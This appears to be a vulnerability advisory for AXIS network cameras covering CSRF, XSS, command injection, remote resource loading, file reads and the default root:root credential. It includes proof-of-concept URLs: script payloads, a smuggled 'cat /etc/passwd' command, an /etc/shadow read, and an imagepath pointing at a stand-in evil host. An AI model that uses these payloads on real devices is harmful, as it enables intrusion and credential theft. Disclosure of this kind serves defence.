  "Description": "CWE-352: Cross-Site Request Forgery (CSRF) - CVE-2015-8255 ** AXIS NETWORK CAMERAS MULTIPLE XSRF ** DESCRIPTION Multiple occurrences of XSRF in the AXIS Network Cameras models P3384, AXIS \nP5532-E and 2.* and other models. CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting') - CVE-2015-8256\nCross-site scripting (XSS) vulnerability in the web interface\nin AXIS P3384 Network Camera allows remote attackers to inject\narbitrary web script via imagePath (as in the case VU#672128)\nparameter also in the script custom_whiteBalance.shtml[1] and in\nanother new vector[2]. [1] http://{AXIS-P3384}/view/custom_whiteBalance.shtml?imagePath=<img src=\"xs\" \nonerror=alert(7) /><!-- [2] http://{AXIS-P3384}/admin-bin/editcgi.cgi?file=<script>alert(1)</script> ** NEW XSS VECTORS ** DESCRIPTION Cross-site scripting (XSS) vulnerability in the web interface\nin AXIS Network Cameras allows remote attackers to inject arbitrary web script \nvia\ngroup parameter. ** STORED CROSS-SITE SCRIPTING ** DESCRIPTION AXIS NETWORK CAMERAS P3384, AXIS P5532-E, 2.* and other models is prone to a \nstored Cross-Site Scripting (XSS) vulnerability in the application's log file, \nwhich allows to inject arbitrary JavaScript. CWE-77: Improper Neutralization of Special Elements used in a Command ('Command Injection') - CVE-2015-8257 Vulnerability Details: AXIS P5532-E Network Camera  is vulnerable to (authenticated) remote command \nexecution. AXIS P3384 Network Camera (Web Management) is vulnerable to (authenticated) \nremote command execution via GET requests. This flow allows the execution of \narbitrary commands on the system. POC: http://{AXIS-P3384}/{VULNSCRP}?app=4ny%3bcat%20/etc/passwd%00 This will return the entire contents of the /etc/passwd file\ncontaining the users local system. CWE-99: Improper Control of Resource Identifiers ('Resource Injection') - CVE-2015-8258 AXIS IMAGEPATH INSECURE REQUEST (REMOTE CODE EXECUTION) The imagepath variable (which also suffers from XSS) to get an URL processes \nthe request normally performing a GET request to the address provided, which \ncan be used to execute malicious code on the user's browser that manages the \ncamera, as shown below. This vulnerability affects Axis Network Camera models \n2* p3384* P5532*. An attacker sends the following URL for the current Web user interface of the \ncamera: http://{AXISVULNHOST}/view.shtml?imagepath=http://www.3vilh0st.com/evilcode.html\n axishost The application provides the user with a resource that can be used to read any \narbitrary file system. Following a 'System Options' -> 'Advanced' -> \n'Scripting' you can access the \"Open Script Editor\" feature that allows you to \nedit the application scripts (shtml, sh, cgi, etc.), but nothing prevents read \nany other system files simply by performing a GET request, as below: http://{AXIS-CAM}/admin-bin/editcgi.cgi?file=/etc/shadow Although the manufacturer makes clear the danger of using such functionality, \nit is possible to read the \"Open Script Editor\": \"Axis strongly recommends That \nYou do not use this function Unless you fully understand the consequencias.\" Ideally, such a feature did not exist because it is very dangerous to be facing \nWeb systems whose default passwords are widely known and whose members rarely \nchanges. CWE-798: Use of Hard-coded Credentials - CVE-2015-8259 Default Credential Vulnerability Details: The default password of web interface (root:root) is rarely changed after \ninstallation. Possession of it is possible to completely manipulate the camera, \nand (based on previous vulnerability) directly confidentiality and availability \nof camera, for example putting a backdoor in the system or leaking information \nor directly affecting system integrity. This is the default credential for XIS \nP3384 Network Camera too. According to the reporter, these vulnerabilities affect the following models: - AXIS M1011 Network Camera\n- AXIS M1011-W Network Camera\n- AXIS M1031-W Network Camera\n- AXIS M1054 Network Camera",
